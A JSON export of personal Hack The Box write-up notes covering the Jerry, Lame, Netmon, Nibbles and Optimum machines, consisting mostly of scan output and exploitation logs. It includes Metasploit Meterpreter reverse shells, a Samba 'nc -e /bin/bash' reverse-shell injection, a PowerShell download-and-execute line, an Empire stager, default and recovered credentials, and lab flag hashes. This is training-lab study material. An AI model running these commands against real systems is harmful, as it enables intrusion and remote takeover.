exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable. [+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. [+] 10.10.10.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. [+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable. [+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed msf5 post(multi/recon/local_exploit_suggester) \u0026gt; use exploit/windows/local/ms10_015_kitrap0d msf5 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; set session 1 session =\u0026gt; 1 msf5 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; set payload windows/meterpreter/reverse_tcp payload =\u0026gt; windows/meterpreter/reverse_tcp msf5 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; set lhost tun0 lhost =\u0026gt; tun0 msf5 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; set lport 4445 lport =\u0026gt; 4445 msf5 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; show options Module options (exploit/windows/local/ms10_015_kitrap0d): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION 1 yes The session to run this module on. Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST tun0 yes The listen address (an interface may be specified) LPORT 4445 yes The listen port Exploit target: Id Name -- ---- 0 Windows 2K SP4 - Windows 7 (x86) msf5 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; show targets Exploit targets: Id Name -- ---- 0 Windows 2K SP4 - Windows 7 (x86) msf5 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.24:4445 [*] Launching notepad to host the exploit... [+] Process 2416 launched. [*] Reflectively injecting the exploit DLL into 2416... [*] Injecting exploit into 2416 ... [*] Exploit injected. Injecting payload into 2416... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (180291 bytes) to 10.10.10.15 [*] Meterpreter session 2 opened (10.10.14.24:4445 -\u0026gt; 10.10.10.15:1031) at 2020-01-25 15:29:11 +0100  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/htb/jerry/",
	"title": "Jerry",
	"tags": ["HTB"],
	"description": "Notes from the Jerry machine on HTB.",
	"content": "Jerry where you at 10.10.10.95\nwhat you got nmap   Related files   full_tcp.gnmap  (0 kb)   full_tcp.nmap  (1 kb)   simple_tcp.gnmap  (0 kb)   simple_tcp.nmap  (1 kb)   simple_udp.gnmap  (0 kb)   simple_udp.nmap  (0 kb)    # Nmap 7.80 scan initiated Thu Jan 23 21:59:39 2020 as: nmap -oX - -A -T4 -p- -oN /mnt/hgfs/_shared_folder/htb/boxes/Jerry/scans/full_tcp.nmap -oG /mnt/hgfs/_shared_folder/htb/boxes/Jerry/scans/full_tcp.gnmap 10.10.10.95 Nmap scan report for 10.10.10.95 Host is up (0.020s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-favicon: Apache Tomcat |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 (90%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops TRACEROUTE (using port 8080/tcp) HOP RTT ADDRESS 1 21.46 ms 10.10.14.1 2 22.07 ms 10.10.10.95 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jan 23 22:01:30 2020 -- 1 IP address (1 host up) scanned in 110.94 seconds  Tomcat 8080 Gobuster   Related files   gobuster_dir_med-txt-html.txt  (0 kb)    Nikto   Related files   nikto.txt  (1 kb)    - Nikto v2.1.6/2.1.5 + No web server found on 10.10.10.95:80 - Nikto v2.1.6/2.1.5 + Target Host: 10.10.10.95 + Target Port: 8080 + GET The anti-clickjacking X-Frame-Options header is not present. + GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + OSVDB-39272: GET /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community + OPTIONS Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS + OSVDB-397: GET HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server. + OSVDB-5646: GET HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server. + MISDLEZU Web Server returns a valid response with junk HTTP methods, this may cause false positives. + GET /examples/servlets/index.html: Apache Tomcat default JSP pages present. + OSVDB-3720: GET /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users. + GET Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat. + GET /host-manager/html: Default Tomcat Manager / Host Manager interface found + GET /manager/html: Tomcat Manager / Host Manager interface found (pass protected) + GET /manager/status: Tomcat Server Status interface found (pass protected)  default creds for for /manager tomcat:s3cret\nhttp://10.10.10.95:8080/manager/status\nApache Tomcat/7.0.88 JVM 1.8.0_171-b11 Windows Server 2012 R2 6.3 amd64 PUT enabled  Apache Tomcat \u0026lt; 9.0.1 (Beta) / \u0026lt; 8.5.23 / \u0026lt; 8.0.47 / \u0026lt; 7.0.8 - JSP Upload Bypass / Remote Code Execution (1) # E-DB Note: https://www.alphabot.com/security/blog/2017/java/Apache-Tomcat-RCE-CVE-2017-12617.html When running on Windows with HTTP PUTs enabled (e.g. via setting the readonly initialisation parameter of the Default to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server. The PoC is like this: PUT /1.jsp/ HTTP/1.1 Host: 192.168.3.103:8080 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer: http://192.168.3.103:8080/examples/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2 Cookie: JSESSIONID=A27674F21B3308B4D893205FD2E2BF94 Connection: close Content-Length: 26 \u0026lt;% out.println(\u0026quot;hello\u0026quot;);%\u0026gt; It is the bypass for CVE-2017-12615  Exploit https://www.exploit-db.com/exploits/42966\n  Related files   tomcat.py  (6 kb)    root@kali:/mnt/hgfs/_shared_folder/htb/boxes/Jerry# python tomcat.py -u http://10.10.10.95:8080/ _______ ________ ___ ___ __ ______ __ ___ __ __ ______ / ____\\ \\ / / ____| |__ \\ / _ \\/_ |____ | /_ |__ \\ / //_ |____ | | | \\ \\ / /| |__ ______ ) | | | || | / /_____| | ) / /_ | | / / | | \\ \\/ / | __|______/ /| | | || | / /______| | / / '_ \\| | / / | |____ \\ / | |____ / /_| |_| || | / / | |/ /| (_) | | / / \\_____| \\/ |______| |____|\\___/ |_|/_/ |_|____\\___/|_|/_/ [@intx0x80] Poc Filename Poc.jsp Not Vulnerable to CVE-2017-12617  msf5 exploit(multi/http/tomcat_mgr_upload) \u0026gt; set lhost tun0 lhost =\u0026gt; tun0 msf5 exploit(multi/http/tomcat_mgr_upload) \u0026gt; set lport 8000 lport =\u0026gt; 8000 msf5 exploit(multi/http/tomcat_mgr_upload) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.23:8000 [*] Retrieving session ID and CSRF token... [*] Uploading and deploying a9s3TMHp9xeIwkwE... [*] Executing a9s3TMHp9xeIwkwE... [*] Undeploying a9s3TMHp9xeIwkwE ... [*] Sending stage (53906 bytes) to 10.10.10.95 [*] Meterpreter session 1 opened (10.10.14.23:8000 -\u0026gt; 10.10.10.95:49192) at 2020-01-23 22:34:43 +0100 meterpreter \u0026gt; getuid Server username: JERRY$ C:\\Users\\Administrator\\Desktop\\flags\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is FC2B-E489 Directory of C:\\Users\\Administrator\\Desktop\\flags 06/19/2018 06:09 AM \u0026lt;DIR\u0026gt; . 06/19/2018 06:09 AM \u0026lt;DIR\u0026gt; .. 06/19/2018 06:11 AM 88 2 for the price of 1.txt 1 File(s) 88 bytes 2 Dir(s) 27,545,739,264 bytes free C:\\Users\\Administrator\\Desktop\\flags\u0026gt;type \u0026quot;2 for the price of 1.txt\u0026quot; type \u0026quot;2 for the price of 1.txt\u0026quot; user.txt 7004dbcef0f854e0fb401875f26ebd00 root.txt 04a8b36e1545a455393d067e772fe90e  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/htb/lame/",
	"title": "Lame",
	"tags": ["HTB"],
	"description": "Notes from the Lame machine on HTB.",
	"content": "lame where you at 10.10.10.3\nwhat you got # Nmap 7.60 scan initiated Wed Jan 22 15:42:48 2020 as: nmap -oX - -sS -T4 -oN /home/justin-p/Documents/htb/Lame/scans/simple_tcp.nmap -oG /home/justin-p/Documents/htb/Lame/scans/simple_tcp.gnmap 10.10.10.3 Nmap scan report for 10.10.10.3 Host is up (0.028s latency). Not shown: 996 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds # Nmap done at Wed Jan 22 15:42:58 2020 -- 1 IP address (1 host up) scanned in 10.11 seconds  ftp justin-p@FapTop:~/Documents/htb/Lame$ ftp -p 10.10.10.3 Connected to 10.10.10.3. 220 (vsFTPd 2.3.4) Name (10.10.10.3:justin-p): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 227 Entering Passive Mode (10,10,10,3,176,200). 150 Here comes the directory listing. 226 Directory send OK  IPC Service (lame server (Samba 3.0.20-Debian))\njustin-p@FapTop:~/Documents$ nc -nlvp 9999 Listening on [0.0.0.0] (family 0, port 9999) Connection from 10.10.10.3 37851 received! whoami root ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── root@FapTop:~/Documents/htb/Lame# python smbtool.py 10.10.10.3 (logon “./=`nohup nc -e /bin/bash 10.10.14.7 9999`\u0026quot;)  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/htb/metmon/",
	"title": "Netmon",
	"tags": ["HTB"],
	"description": "Notes from the Netmon machine on HTB.",
	"content": "Netmon Where you at 10.10.10.152\nWhat you got   Related files   full_tcp.gnmap  (1 kb)   full_tcp.nmap  (3 kb)   simple_tcp.gnmap  (0 kb)   simple_tcp.nmap  (2 kb)   simple_udp.gnmap  (1 kb)   simple_udp.nmap  (1 kb)    PRTG Network Monitor 18.1.37.13946\nPORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230)  root@kali:/mnt/hgfs/_shared_folder/htb/boxes/Netmon# pftp 10.10.10.152 Connected to 10.10.10.152. 220 Microsoft FTP Service Name (10.10.10.152:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; ls 227 Entering Passive Mode (10,10,10,152,210,167). 150 Opening ASCII mode data connection. 02-02-19 11:18PM 1024 .rnd 02-25-19 09:15PM \u0026lt;DIR\u0026gt; inetpub 07-16-16 08:18AM \u0026lt;DIR\u0026gt; PerfLogs 02-25-19 09:56PM \u0026lt;DIR\u0026gt; Program Files 02-02-19 11:28PM \u0026lt;DIR\u0026gt; Program Files (x86) 02-03-19 07:08AM \u0026lt;DIR\u0026gt; Users 02-25-19 10:49PM \u0026lt;DIR\u0026gt; Windows 226 Transfer complete. ftp\u0026gt; cd Users 250 CWD command successful. ftp\u0026gt; ls 227 Entering Passive Mode (10,10,10,152,210,168). 150 Opening ASCII mode data connection. 02-25-19 10:44PM \u0026lt;DIR\u0026gt; Administrator 02-02-19 11:35PM \u0026lt;DIR\u0026gt; Public 226 Transfer complete. ftp\u0026gt; cd Administrator 550 Access is denied. ftp\u0026gt; cd Public 250 CWD command successful. ftp\u0026gt; ls 227 Entering Passive Mode (10,10,10,152,210,170). 150 Opening ASCII mode data connection. 02-03-19 07:05AM \u0026lt;DIR\u0026gt; Documents 07-16-16 08:18AM \u0026lt;DIR\u0026gt; Downloads 07-16-16 08:18AM \u0026lt;DIR\u0026gt; Music 07-16-16 08:18AM \u0026lt;DIR\u0026gt; Pictures 02-02-19 11:35PM 33 user.txt 07-16-16 08:18AM \u0026lt;DIR\u0026gt; Videos 226 Transfer complete. ftp\u0026gt; get user.txt local: user.txt remote: user.txt 227 Entering Passive Mode (10,10,10,152,210,173). 150 Opening ASCII mode data connection. WARNING! 1 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 33 bytes received in 0.02 secs (1.8494 kB/s)  PRTG data folder\nhttps://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data\n%programdata%\\Paessler\\PRTG Network Monitor\n150 Opening ASCII mode data connection. 02-02-19 11:40PM \u0026lt;DIR\u0026gt; Configuration Auto-Backups 01-25-20 05:33AM \u0026lt;DIR\u0026gt; Log Database 02-02-19 11:18PM \u0026lt;DIR\u0026gt; Logs (Debug) 02-02-19 11:18PM \u0026lt;DIR\u0026gt; Logs (Sensors) 02-02-19 11:18PM \u0026lt;DIR\u0026gt; Logs (System) 01-25-20 05:33AM \u0026lt;DIR\u0026gt; Logs (Web Server) 01-25-20 05:38AM \u0026lt;DIR\u0026gt; Monitoring Database 02-25-19 09:54PM 1189697 PRTG Configuration.dat 01-25-20 11:07AM 1205235 PRTG Configuration.old 07-14-18 02:13AM 1153755 PRTG Configuration.old.bak 01-25-20 11:07AM 1717015 PRTG Graph Data Cache.dat 02-25-19 10:00PM \u0026lt;DIR\u0026gt; Report PDFs 02-02-19 11:18PM \u0026lt;DIR\u0026gt; System Information Database 02-02-19 11:40PM \u0026lt;DIR\u0026gt; Ticket Database 02-02-19 11:18PM \u0026lt;DIR\u0026gt; ToDo Database ftp\u0026gt; get PRTG Configuration.dat local: Configuration.dat remote: PRTG 227 Entering Passive Mode (10,10,10,152,213,160). 550 The system cannot find the file specified. ftp\u0026gt; get \u0026quot;PRTG Configuration.dat\u0026quot; local: PRTG Configuration.dat remote: PRTG Configuration.dat 227 Entering Passive Mode (10,10,10,152,213,161). 150 Opening ASCII mode data connection. 226 Transfer complete. 1189697 bytes received in 0.28 secs (4.0834 MB/s) ftp\u0026gt; get \u0026quot;PRTG Configuration.old\u0026quot; local: PRTG Configuration.old remote: PRTG Configuration.old 227 Entering Passive Mode (10,10,10,152,213,162). 150 Opening ASCII mode data connection. 226 Transfer complete. 1205235 bytes received in 0.28 secs (4.0449 MB/s) ftp\u0026gt; get \u0026quot;PRTG Configuration.old.bak\u0026quot; local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak 227 Entering Passive Mode (10,10,10,152,213,163). 125 Data connection already open; Transfer starting. 226 Transfer complete. 1153755 bytes received in 0.28 secs (3.8816 MB/s) ftp\u0026gt; cd \u0026quot;Configuration Auto-Backups\u0026quot; 250 CWD command successful. ftp\u0026gt; ls 227 Entering Passive Mode (10,10,10,152,213,173). 150 Opening ASCII mode data connection. 02-02-19 11:40PM 59461 PRTG Configuration (Update to 18.1.37.13946).zip 226 Transfer complete. ftp\u0026gt; get \u0026quot;PRTG Configuration (Update to 18.1.37.13946).zip\u0026quot; local: PRTG Configuration (Update to 18.1.37.13946).zip remote: PRTG Configuration (Update to 18.1.37.13946).zip    Related files   PRTG Configuration (Update to 18.1.37.13946).zip  (58 kb)    .dat \u0026lt;name\u0026gt; PRTG System Administrator \u0026lt;/name\u0026gt; \u0026lt;ownerid\u0026gt; 100 \u0026lt;/ownerid\u0026gt; \u0026lt;password\u0026gt; \u0026lt;flags\u0026gt; \u0026lt;encrypted/\u0026gt; \u0026lt;/flags\u0026gt; \u0026lt;cell col=\u0026quot;0\u0026quot; crypt=\u0026quot;PRTG\u0026quot;\u0026gt; JO3Y7LLK7IBKCMDN3DABSVAQO5MR5IDWF3MJLDOWSA====== \u0026lt;/cell\u0026gt; \u0026lt;cell col=\u0026quot;1\u0026quot; crypt=\u0026quot;PRTG\u0026quot;\u0026gt; OEASMEIE74Q5VXSPFJA2EEGBMEUEXFWW \u0026lt;/cell\u0026gt; \u0026lt;/password\u0026gt; .old \u0026lt;/lastlogin\u0026gt; \u0026lt;login\u0026gt; prtgadmin \u0026lt;/login\u0026gt; \u0026lt;name\u0026gt; PRTG System Administrator \u0026lt;/name\u0026gt; \u0026lt;ownerid\u0026gt; 100 \u0026lt;/ownerid\u0026gt; \u0026lt;password\u0026gt; \u0026lt;flags\u0026gt; \u0026lt;encrypted/\u0026gt; \u0026lt;/flags\u0026gt; \u0026lt;cell col=\u0026quot;0\u0026quot; crypt=\u0026quot;PRTG\u0026quot;\u0026gt; H3CVKBQ3ZLXUFZ3NAPPUJWNW62R3VOYAY77KKCTQSU====== \u0026lt;/cell\u0026gt; \u0026lt;cell col=\u0026quot;1\u0026quot; crypt=\u0026quot;PRTG\u0026quot;\u0026gt; TTVJE4XYVKU2C3NBALRRPCIO4KHETERB \u0026lt;/cell\u0026gt;  .old.bak\n  Related files   PRTG Configuration.old.bak  (1098 kb)    \u0026lt;!-- User: prtgadmin --\u0026gt; PrTg@dmin2018  prtgadmin:PrTg@dmin2018 prtgadmin:PrTg@dmin2019 -\u0026gt; successful\nreverse shell https://thehackingtutorials.com/prtg-network-monitor-exploit-with-poc/\ncreate notification\nexample.ps1\nparam: test.txt;powershell -noP -sta -w 1 -enc SQBGA....BFAFgA (Empire: listeners) \u0026gt; [*] Sending POWERSHELL stager (stage 1) to 10.10.10.152 [*] New agent G9MS1YKR checked in [+] Initial agent G9MS1YKR from 10.10.10.152 now active (Slack) [*] Sending agent (stage 2) to G9MS1YKR at 10.10.10.152 (Empire: G9MS1YKR) \u0026gt; whoami [*] Agent G9MS1YKR returned results. nt authority\\system  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/htb/nibbles/",
	"title": "Nibbles",
	"tags": ["HTB"],
	"description": "Notes from the Nibbles machine on HTB.",
	"content": "Nibbles where you at 10.10.10.75\nwhat you got   Related files   full_tcp.gnmap  (0 kb)   full_tcp.nmap  (1 kb)   simple_tcp.gnmap  (0 kb)   simple_tcp.nmap  (2 kb)   simple_udp.gnmap  (0 kb)   simple_udp.nmap  (0 kb)      Related files   gobuster_dir_med-txt-html.txt  (0 kb)      Related files   nikto.txt  (0 kb)    http://10.10.10.75/nibbleblog/admin\nadmin:nibbels\nhttps://www.exploit-db.com/exploits/38489\nmsf5 \u0026gt; search nibble Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/nibbleblog_file_upload 2015-09-01 excellent Yes Nibbleblog File Upload Vulnerability msf5 \u0026gt; use 0 msf5 exploit(multi/http/nibbleblog_file_upload) \u0026gt; set LHOST tun0 LHOST =\u0026gt; tun0 msf5 exploit(multi/http/nibbleblog_file_upload) \u0026gt; set LPORT 4444 LPORT =\u0026gt; 4444 msf5 exploit(multi/http/nibbleblog_file_upload) \u0026gt; set USERNAME admin USERNAME =\u0026gt; admin msf5 exploit(multi/http/nibbleblog_file_upload) \u0026gt; set PASSWORD nibbles PASSWORD =\u0026gt; nibbles msf5 exploit(multi/http/nibbleblog_file_upload) \u0026gt; show options Module options (exploit/multi/http/nibbleblog_file_upload): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD nibbles yes The password to authenticate with Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The base path to the web application USERNAME admin yes The username to authenticate with VHOST no HTTP server virtual host Exploit target: Id Name -- ---- 0 Nibbleblog 4.0.3 msf5 exploit(multi/http/nibbleblog_file_upload) \u0026gt; set TARGETURI /nibbleblog TARGETURI =\u0026gt; /nibbleblog msf5 exploit(multi/http/nibbleblog_file_upload) \u0026gt; run [-] Exploit failed: The following options failed to validate: RHOSTS. [*] Exploit completed, but no session was created. msf5 exploit(multi/http/nibbleblog_file_upload) \u0026gt; set RHOST 10.10.10.75 RHOST =\u0026gt; 10.10.10.75 msf5 exploit(multi/http/nibbleblog_file_upload) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.23:4444 [*] Sending stage (38288 bytes) to 10.10.10.75 [*] Meterpreter session 1 opened (10.10.14.23:4444 -\u0026gt; 10.10.10.75:57370) at 2020-01-24 00:58:54 +0100 [+] Deleted image.php meterpreter \u0026gt; meterpreter \u0026gt; sysinfo Computer : Nibbles OS : Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 Meterpreter : php/linux meterpreter \u0026gt; getuid Server username: nibbler (1001) meterpreter \u0026gt; msf5 exploit(multi/http/nibbleblog_file_upload) \u0026gt; search suggest Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/server/icmp_exfil normal No ICMP Exfiltration Service 1 exploit/windows/browser/ms10_018_ie_behaviors 2010-03-09 good No MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free 2 exploit/windows/smb/timbuktu_plughntcommand_bof 2009-06-25 great No Timbuktu PlughNTCommand Named Pipe Buffer Overflow 3 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester 4 post/osx/gather/enum_colloquy normal No OS X Gather Colloquy Enumeration 5 post/osx/manage/sonic_pi normal No OS X Manage Sonic Pi msf5 exploit(multi/http/nibbleblog_file_upload) \u0026gt; use 3 msf5 post(multi/recon/local_exploit_suggester) \u0026gt; set session 1 session =\u0026gt; 1 msf5 post(multi/recon/local_exploit_suggester) \u0026gt; run [*] 10.10.10.75 - Collecting local exploits for php/linux... [-] 10.10.10.75 - No suggestions available. [*] Post module execution completed msf5 post(multi/recon/local_exploit_suggester) \u0026gt;  home has personal.zip, has monitor script in it. user can run it as root.\nTesting 'sudo -l' without password \u0026amp; /etc/sudoers [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands Matching Defaults entries for nibbler on Nibbles: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh  create file /home/nibbler/personal/stuff/monitor.sh\n/bin/bash -i  cd /home/nibbler/personal/stuff/ sudo ./monitor.sh sudo ./monitor.sh sudo: unable to resolve host Nibbles: Connection timed out bash: cannot set terminal process group (1309): Inappropriate ioctl for device bash: no job control in this shell root@Nibbles:/home/nibbler/personal/stuff# cd /root cd /root root@Nibbles:~# ls ls root.txt root@Nibbles:~# cat root.txt cat root.txt b6d745c0dfb6457c55591efc898ef88c  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/htb/optimum/",
	"title": "Optimum",
	"tags": ["HTB"],
	"description": "Notes from the Optimum machine on HTB.",
	"content": "optimum where you at 10.10.10.8\nwhat you got   Related files   full_tcp.gnmap  (0 kb)   full_tcp.nmap  (1 kb)   simple_tcp.gnmap  (0 kb)   simple_tcp.nmap  (1 kb)   simple_udp.gnmap  (0 kb)   simple_udp.nmap  (0 kb)    # Nmap 7.80 scan initiated Fri Jan 24 15:18:36 2020 as: nmap -oX - -A -T4 -p- -oN /mnt/hgfs/_shared_folder/htb/boxes/Optimum/scans/full_tcp.nmap -oG /mnt/hgfs/_shared_folder/htb/boxes/Optimum/scans/full_tcp.gnmap 10.10.10.8 Nmap scan report for 10.10.10.8 Host is up (0.020s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Microsoft Windows Server 2012 (98%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (98%), Microsoft Windows Server 2012 R2 (98%), Microsoft Windows 7 Professional (91%), Microsoft Windows Embedded Standard 7 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 (89%), Microsoft Windows Server 2008 R2 (89%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 21.08 ms 10.10.14.1 2 21.03 ms 10.10.10.8 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jan 24 15:20:18 2020 -- 1 IP address (1 host up) scanned in 101.59 seconds    Related files   nikto.txt  (0 kb)    - Nikto v2.1.6/2.1.5 + Target Host: 10.10.10.8 + Target Port: 80 + GET Cookie HFS_SID created without the httponly flag + GET The anti-clickjacking X-Frame-Options header is not present. + GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + OSVDB-38019: GET /?mod=\u0026lt;script\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt;\u0026amp;op=browse: Sage 1.0b3 is vulnerable to Cross Site Scripting (XSS). CA-2000-02.    Related files   gobuster_dir_med-txt-html.txt  (0 kb)    Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit) | exploits/windows/remote/34926.rb Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities | exploits/windows/remote/31056.py Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload | exploits/multiple/remote/30850.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1) | exploits/windows/remote/34668.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | exploits/windows/remote/39161.py Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution | exploits/windows/webapps/34852.txt  msf5 exploit(windows/http/rejetto_hfs_exec) \u0026gt; show options Module options (exploit/windows/http/rejetto_hfs_exec): Name Current Setting Required Description ---- --------------- -------- ----------- HTTPDELAY 10 no Seconds to wait before terminating web server Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.8 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 80 yes The target port (TCP) SRVHOST 10.10.14.24 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 4444 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI / yes The path of the web application URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.14.24 yes The listen address (an interface may be specified) LPORT 8080 yes The listen port Exploit target: Id Name -- ---- 0 Automatic msf5 exploit(windows/http/rejetto_hfs_exec) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.24:8080 [*] Using URL: http://10.10.14.24:4444/MCCmUGaEI9axpem [*] Server started. [*] Sending a malicious request to / [*] Payload request received: /MCCmUGaEI9axpem [*] Sending stage (206403 bytes) to 10.10.10.8 [*] Meterpreter session 2 opened (10.10.14.24:8080 -\u0026gt; 10.10.10.8:49613) at 2020-01-24 20:16:19 +0100 [!] Tried to delete %TEMP%\\rSrxEg.vbs, unknown result [*] Server stopped. meterpreter \u0026gt; sysinfo Computer : OPTIMUM OS : Windows 2012 R2 (6.3 Build 9600). Architecture : x64 System Language : el_GR Domain : HTB Logged On Users : 1 Meterpreter : x64/windows meterpreter \u0026gt; powershell \u0026quot;IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.24:8888/Sherlock.ps1');$a=find-allvulns;$a | where-object {$_.VulnStatus -notlike 'not *'}| ft Title,VulnStatus,MSBulletin,CVEID,Link -autosize\u0026quot; Title VulnStatus MSBulletin CVEID ----- ---------- ---------- ----- Secondary Logon Handle Appears Vulnerable MS16-032 2016-0099 Windows Kernel-Mode Drivers EoP Appears Vulnerable MS16-034 2016-0093/94/9... Win32k Elevation of Privilege Appears Vulnerable MS16-135 2016-7255 Background session 2? [y/N]    Related files    ./windows-exploit-suggester.py -i /mnt/hgfs/_shared_folder/htb/boxes/Optimum/scans/systeminfo.txt -d 2020-01-24-mssb.xls \u0026gt;\u0026gt; 